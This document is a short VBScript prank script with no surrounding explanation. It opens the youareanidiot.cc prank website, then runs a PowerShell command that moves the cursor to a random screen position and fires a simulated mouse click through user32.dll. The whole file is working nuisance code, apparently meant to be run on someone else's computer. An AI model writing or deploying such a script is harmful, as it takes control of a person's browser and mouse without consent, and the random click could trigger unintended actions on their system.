Set shell = CreateObject("WScript.Shell")
shell.Run "https://youareanidiot.cc/"
WScript.Sleep 2000  
Randomize
maxX = 1600  
maxY = 900    
randX = Int(Rnd() * maxX)
randY = Int(Rnd() * maxY)
cmd = "powershell -command ""Add-Type -AssemblyName System.Windows.Forms; " & _
      "[System.Windows.Forms.Cursor]::Position = [System.Drawing.Point]::new(" & randX & "," & randY & "); " & _
      "$sig = '[DllImport(""user32.dll"")] public static extern void mouse_event(int a, int b, int c, int d, int e);'; " & _
      "Add-Type -MemberDefinition $sig -Name 'M' -Namespace 'Win32'; " & _
      "[Win32.M]::mouse_event(2,0,0,0,0); [Win32.M]::mouse_event(4,0,0,0,0);"""

shell.Run cmd

